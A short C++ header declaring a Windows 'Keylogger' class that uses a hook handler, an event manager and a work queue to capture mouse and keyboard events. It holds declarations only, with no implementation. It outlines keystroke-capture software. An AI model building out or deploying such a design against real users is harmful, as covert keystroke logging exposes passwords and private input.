/**
 * Project Keylogger
 */


#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#include <Windows.h>
#include <iostream>

#include "MouseEvent.h"
#include "KeyboardEvent.h"
#include "EventManager.h"
#include "HookHandler.h"
#include "IKeylogger.h"
#include "WorkQueue.h"

class Keylogger : public IKeylogger {
public:
    Keylogger(WorkQueue& wqueue);
	~Keylogger();
    bool				init();   
    bool				run();
    bool				stop();
    bool				kill();
	bool				pushToQueue(const AEvent*);

private: 
	bool				_running;
    EventManager		_eventManager;
    HookHandler			_hookHandler;
	WorkQueue&			_levents;
};

#endif //_KEYLOGGER_H
